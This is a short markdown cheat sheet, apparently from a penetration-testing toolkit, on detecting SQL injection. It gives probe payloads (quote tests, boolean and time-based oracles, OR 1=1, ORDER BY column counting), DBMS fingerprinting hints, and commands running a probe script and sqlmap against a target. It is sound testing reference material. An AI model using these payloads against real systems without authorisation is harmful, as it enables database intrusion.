# Detecting SQL injection

Test **every** input: query params, form fields, path segments (`/photo/3`), cookies, headers,
JSON values, search boxes, sort/order params.

## Probes and what they mean
| Send | If injectable |
|---|---|
| `'` | error / 500 / empty result (string context) |
| `''` | back to normal (quote balanced) |
| `"` | error in double-quoted context |
| `3-1` vs `2` (numeric) | same result ⇒ numeric context evaluated |
| `x' AND '1'='1` vs `x' AND '1'='2` | different results ⇒ boolean oracle |
| `x' OR 1=1-- ` | more rows |
| `' ORDER BY 10-- ` | error at N+1 ⇒ N columns |
| `x' AND SLEEP(3)-- ` / `' || pg_sleep(3)-- ` | delay ⇒ time-based |
| `%' -- ` in LIKE search | all rows |

Comments: `-- ` (needs trailing space; in URL `--+` or `--%20`), `#` (MySQL, URL `%23`), `/* */`.
SQLite/Postgres/Oracle use `||` for concat; MySQL uses `CONCAT()`.

## Fingerprint the DBMS
| Test | DBMS |
|---|---|
| `sqlite_version()` works / errors mention `sqlite3` | SQLite |
| `@@version`, `SLEEP()`, `updatexml` error, `#` comment | MySQL/MariaDB |
| `version()`, `pg_sleep()`, `::int` casts | PostgreSQL |
| `@@version` + `WAITFOR DELAY` | MSSQL |
| `FROM dual` required | Oracle |
Stack hints: Flask+stdlib usually SQLite; PHP usually MySQL.

## Fast automated check
```bash
python scripts/sqli/sqli_probe.py "$T/search?q=FUZZ"
python scripts/sqli/sqli_probe.py "$T/login" --data 'username=FUZZ&password=x'
sqlmap -u "$T/search?q=x" --batch --level 3 --risk 2        # tools/sqlmap.md
```
Then pick the technique from the [README tree](README.md).
